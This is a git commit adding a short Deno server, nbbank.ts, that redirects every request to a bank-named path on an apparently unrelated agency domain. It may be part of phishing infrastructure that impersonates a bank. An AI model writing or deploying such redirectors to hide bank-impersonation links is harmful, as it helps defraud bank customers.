55584ffb6a0f8acc98748e11abb6cc50fe0569fb
Digital2025001 <bosmichael30@gmail.com>
2025-07-08 08:34:30 -0700

    Create nbbank.ts

---
+++ nbbank.ts
@@ -0,0 +1,10 @@
+import { serve } from "https://deno.land/std/http/server.ts";
+
+serve((_req) => {
+  return new Response(null, {
+    status: 302,
+    headers: {
+      Location: "https://sparktech.agency/NationalBank/Blacksburg/", // Replace this with your actual link
+    },
+  });
+});
